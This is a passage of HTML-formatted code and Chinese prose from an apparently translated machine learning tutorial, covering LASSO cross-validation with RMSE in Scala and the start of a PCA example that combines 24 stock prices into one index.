&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dpForTesting&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;numericDTM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;cv&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifiersForTesting&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;numericDTM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;cv&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-43&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//These are the lambda values we will verify against&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//这些是我们将要验证的λ值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lambdas&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.25&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-47&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lambdas&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Define a new model based on the training data and one of the lambda&#39;s&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//定义一个基于训练数据和其中一个λ值的新模型&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;LASSO&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dpForTraining&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifiersForTraining&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Compute the RMSE for this model with this lambda&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//计算该模型的RMSE值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dpForTesting&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;zip &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;classifiersForTesting&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-56&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;RMSE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Math&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;results&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                 &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;length&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-61&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Lambda: &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; RMSE: &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;RMSE&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-62&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0086 seconds] --&gt;
&lt;p&gt;多次运行这段代码会给出一个在 36 和 51 之间变化的 RMSE 值。这表示我们排序的预测值会偏离至少 36 位。鉴于我们要尝试预测最高的 100 位，结果表明这个模型的效果非常差。在本例中，λ 值变化对模型的影响并不明显。然而，在实践中应用这种算法时，要小心地选取 λ 值： λ 值选得越大，算法选取的特征数就越少。 所以，交叉验证法对分析不同 λ 值对算法的影响很重要。&lt;/p&gt;
&lt;p&gt;引述 &lt;a href=&quot;http://en.wikipedia.org/wiki/John_Tukey&quot;&gt;John Tukey&lt;/a&gt; 的一句话来总结这个实例：&lt;/p&gt;
&lt;p&gt;“数据中未必隐含答案。某些数据和对答案的迫切渴求的结合，无法保证人们从一堆给定数据中提取出一个合理的答案。”&lt;/p&gt;
&lt;h2&gt;应用无监督学习合并特征（PCA）&lt;/h2&gt;
&lt;p&gt;主成分分析 (PCA) 的基本思路是减少一个问题的维数。这是一个很好的方法，它可以避免维灾难，也可以帮助合并数据，避开无关数据的干扰，使其中的趋势更明显。&lt;/p&gt;
&lt;p&gt;在本例中，我们打算应用 PCA 把 2002-2012 年这段时间内 24 只股票的股价合并为一只股票的股价。这个随时间变化的值就代表一个基于这 24 只股票数据的股票市场指数。把这24种股票价格合并为一种，明显地减少了处理过程中的数据量，并减少了数据维数，对于之后应用其他机器学习算法作预测，如回归分析来说，有很大的好处。为了看出特征数从 24 减少为 1 之后的效果，我们会将结果与同一时期的道琼斯指数 (DJI) 作比较。&lt;/p&gt;
&lt;p&gt;随着工程的开始，下一步要做的是加载数据。为此，我们提供了两个文件：&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/PCA_Example_1.csv&quot;&gt;Data file 1&lt;/a&gt; 和 &lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/PCA_Example_2.csv&quot;&gt;Data file 2&lt;/a&gt;.&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613b5478301554&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
object PCA extends SimpleSwingApplication{


  def top = new MainFrame {
    title = &quot;PCA Example&quot;
    //Get the example data
    //获取案例数据
    val basePath = &quot;/users/.../Example Data/&quot;
    val exampleDataPath = basePath + &quot;PCA_Example_1.csv&quot;
    val trainData = getStockDataFromCSV(new File(exampleDataPath))

    }
  def getStockDataFromCSV(file: File): (Array[Date],Array[Array[Double]]) = {
    val source = scala.io.Source.fromFile(file)
    //Get all the records (minus the header)
    //获取所有记录（减去标头）
    val data = source
        .getLines()
        .drop(1)
        .map(x =&amp;gt; getStockDataFromString(x))
        .toArray

    source.close()
